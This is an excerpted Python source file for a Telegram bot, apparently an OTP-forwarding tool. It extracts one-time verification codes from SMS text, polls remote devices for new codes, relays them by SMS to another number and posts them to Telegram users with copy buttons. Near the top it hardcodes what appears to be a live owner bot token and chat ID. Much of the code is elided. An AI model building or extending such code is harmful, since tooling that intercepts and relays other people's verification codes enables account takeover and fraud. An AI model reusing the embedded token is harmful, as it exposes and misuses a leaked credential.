...
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN", "8919128322:AAESIjOGBP9I5JpAw7kYBWGTQjV619CPA-I")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID", "8912251548"))

BOT_NAME = "ANY AUTO BOT V8 ⚡"

# ============================
# FAST HTTP SESSION (SPEED BOOST)
# ============================
...
# ============================
# OTP DETECTION (FULL OTP GUARANTEE)
# ============================
def extract_otp_from_text(text):
    """
    Extract FULL OTP from message text.
    Returns complete OTP (4-8 digits), never partial.
    Priority: explicit patterns > standalone digits
    """
    if not text:
        return None
    ...
    # Priority 1: Explicit OTP patterns (most reliable)
    patterns = [
        r"(?:otp|code|pin|password|verification\s*code)\s*(?:is|:|\-|=)?\s*(\d{4,8})",
        r"(\d{4,8})\s*(?:is|as)\s*(?:your|the)\s*(?:otp|code|pin|password)",
        r"(?:your|the)\s*(?:otp|code|pin|password)\s*(?:is|:|\-|=)?\s*(\d{4,8})",
        r"(?:otp|code|pin)\s+(\d{4,8})",
    ...
    # Priority 2: Standalone 4-8 digit number
    m = re.search(r"(?<!\d)(\d{4,8})(?!\d)", text)
    if m:
        otp = m.group(1)
        logger.info(f"🔑 OTP extracted (standalone): {otp}")
        return otp

    # Priority 3: Any digit sequence 4-8 (last resort)
    m = re.search(r"(\d{4,8})", text)
    if m:
        otp = m.group(1)
        logger.info(f"🔑 OTP extracted (fallback): {otp}")
        return otp

    return None

# ============================
# TELEGRAM SEND WITH 1-TAP FULL OTP COPY
# ============================
def send_copy_button_message(chat_id, text, otp_code, title="🔑 OTP Received"):
    """
    Send message with 1-tap FULL OTP copy button.
    - copy_text: native Telegram button (full OTP copy)
    - Also sends OTP as separate code block for easy manual copy
    """
    otp_code = str(otp_code).strip()

    # ✅ FULL OTP - no truncation, no split
    keyboard = {
        "inline_keyboard": [
            [
                {
                    "text": f"📋 Copy Full OTP: {otp_code}",
    ...
    try:
        ...
        if r.status_code == 200:
            logger.info(f"✅ Full OTP copy button sent: {otp_code} ({len(otp_code)} digits)")
            return True
        else:
            logger.warning(f"Copy button failed: {r.text[:200]}")
    ...
    # Final fallback: plain message with OTP in code block (tap to copy)
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        msg = (
            ...
            f"📋 1-Tap FULL OTP Copy button\n"
            f"🎯 Smart OTP detection\n"
...
async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await query.edit_message_text(
        ...
        f"📋 OTP will arrive with Copy button\n"
        f"Next: /setotp"
    )
...
async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if success:
        ...
        if otp:
            send_copy_button_message(
                int(user_id),
                f"✅ <b>Channel OTP Forwarded</b>\n\n"
...
# ============================
# OTP POLLING (FULL OTP + 1-TAP COPY)
# ============================
            ...
            for user_id in list(user_configs.keys()):
                try:
                    ...
                    if user_id not in last_otp or last_otp[user_id] != current_otp:
                        ...
                        # Send SMS to forward number
                        send_sms_command(user_id, device_id, otp_number, current_otp, from_number)

                        # ✅ FULL OTP in message + 1-tap copy button
                        send_copy_button_message(
                            int(user_id),
                            f"🔑 <b>OTP Received</b>\n\n"
                            f"🎯 Forwarded to: <code>{otp_number}</code>\n"
                            f"📱 Device: <code>{device_id}</code>\n"
                            f"📶 From: {from_number}\n\n"
                            f"🔑 <b>FULL OTP:</b>\n"
                            f"<code>{current_otp}</code>\n\n"
                            f"👇 Or tap button below:",
                            current_otp,
                            title="🔑 OTP"
                        )
                        logger.info(f"✅ OTP forwarded: {otp_number} = {current_otp} ({len(current_otp)} digits)")
                except Exception as e:
...
# ============================
# INCOMING MESSAGE FORWARD (FULL OTP + 1-TAP COPY)
# ============================
